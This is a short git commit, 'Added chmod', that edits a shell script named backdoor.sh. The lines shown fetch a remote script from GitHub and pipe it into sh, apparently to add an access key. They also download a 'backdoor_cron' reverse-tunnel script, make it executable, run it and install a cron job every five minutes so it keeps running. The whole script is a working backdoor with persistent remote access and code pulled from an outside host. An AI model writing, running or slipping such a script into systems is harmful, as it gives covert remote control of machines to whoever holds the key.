ac0abb49b21d96cb7579f263496f550b7d9b571f
tpanum <thomas@panum.dk>
2016-07-14 15:19:40 +0200

    Added chmod

--- backdoor.sh
+++ backdoor.sh
@@ -5,7 +5,10 @@ else
     curl https://raw.githubusercontent.com/tpanum/sh/master/add_key.sh | sh
     curl https://raw.githubusercontent.com/tpanum/sh/master/scripts/backdoor_cron.sh > reverse_tunnel_port_$1.sh
     sed -i "s/{{@PORT}}/$1/g" reverse_tunnel_port_$1.sh
+
+    chmod +x reverse_tunnel_port_$1.sh
     ./reverse_tunnel_port_$1.sh
+
     FILE=$(readlink -f reverse_tunnel_port_$1.sh)
     CRON_QUERY="*/5 * * * * /bin/sh $FILE"
     (crontab -l ; echo "$CRON_QUERY") | sort - | uniq - | crontab -
